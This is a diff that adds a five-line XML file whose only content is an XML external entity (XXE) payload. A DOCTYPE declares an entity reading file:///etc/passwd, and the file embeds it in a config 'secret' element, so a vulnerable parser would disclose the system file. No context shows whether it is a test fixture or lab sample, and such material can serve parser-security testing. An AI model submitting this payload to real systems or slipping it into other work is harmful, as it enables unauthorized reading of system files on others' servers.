@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE config [
+  <!ENTITY leak SYSTEM "file:///etc/passwd">
+]>
+<config><secret>&leak;</secret></config>
